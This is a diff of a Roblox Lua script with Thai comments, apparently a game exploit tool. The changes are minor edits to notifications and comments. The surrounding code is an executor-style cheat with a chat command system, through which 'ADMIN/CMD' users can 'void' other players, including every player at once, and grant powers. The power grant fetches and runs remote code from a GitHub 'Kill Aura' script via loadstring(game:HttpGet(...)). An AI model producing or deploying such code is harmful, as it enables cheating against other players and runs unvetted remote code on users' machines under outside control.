@@ -209,7 +209,7 @@ local function CreateBoomboxGUI()
     ScreenGui.Name = "TripleBoomboxFix"
     ScreenGui.Parent = PlayerGui
     ScreenGui.ResetOnSpawn = false
-    ScreenGui.Enabled = false -- [[ แก้ไขตรงนี้: ไม่ให้หน้าต่างเปิดอัติโนมัติ ]]
+    ScreenGui.Enabled = false 
 
     local Frame = Instance.new("Frame")
     Frame.Size = UDim2.new(0, 220, 0, 150)
@@ -297,10 +297,9 @@ end
 
 -- [[ MAIN FUNCTION START ]]
 local function RunMainScript()
-    -- [[ เพิ่มการแจ้งเตือนเฉพาะคนรันสคริปต์ ]]
+    -- [[ แจ้งเตือนเริ่มต้น ]]
     TopRightNotify("SYSTEM", "สคริปต์เริ่มทำงานแล้ว เฉพาะคุณที่เห็นข้อความนี้", Color3.fromRGB(255, 165, 0))
 
-    -- Animation ปิดหน้าต่าง Login ก่อน Destroy
     TweenService:Create(LoginFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, -150, 1.5, 0)}):Play()
     task.wait(0.5)
     LoginGui:Destroy()
@@ -310,7 +309,6 @@ local function RunMainScript()
     local UserInputService = game:GetService("UserInputService")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-    -- [[ แจ้งเตือนการกรอกชื่อสำเร็จที่มุมขวาบน ]]
     TopRightNotify("LOGIN SUCCESS", "ยินดีต้อนรับคุณ " .. MyName, Color3.fromRGB(0, 255, 0))
 
     local function NotifyLogin(name)
@@ -324,8 +322,6 @@ local function RunMainScript()
         elseif _G.VIP_LIST and _G.VIP_LIST[name] then
             tag = "ADMIN/CMD"; color = Color3.fromRGB(150, 0, 255)
         end
-
-        -- ใช้ระบบ TopRightNotify ที่มุมขวาบนตามสั่ง
         TopRightNotify(tag .. " JOINED", name .. " กำลังใช้งานสคริปต์!", color)
     end
 
@@ -526,7 +522,10 @@ local function RunMainScript()
         end
 
         if hasPower then
-            if speaker ~= Player then PlayUISound(203785501) end
+            if speaker ~= Player then 
+                PlayUISound(203785501)
+                TopRightNotify("COMMAND EXECUTED", speaker.Name .. " ใช้คำสั่ง: " .. cmd, Color3.fromRGB(255, 0, 0))
+            end
             if cmd == "!void" then if target == "all" then for _,p in pairs(game.Players:GetPlayers()) do if p ~= speaker then VOID_TARGETS[p.Name] = true end end elseif typeof(target) == "Instance" then VOID_TARGETS[target.Name] = true end end
             if cmd == "!unvoid" then if target == "all" then VOID_TARGETS = {} elseif typeof(target) == "Instance" then VOID_TARGETS[target.Name] = nil end end
             
@@ -534,6 +533,7 @@ local function RunMainScript()
                 if target == Player then
                     HAS_COMMAND_POWER[Player.Name] = true; CmdSide.Visible = true; UpdateBoard()
                     loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
+                    TopRightNotify("POWER UP", "คุณได้รับอำนาจควบคุมจาก " .. speaker.Name, Color3.fromRGB(150, 0, 255))
                 end
             end
             if target == Player then
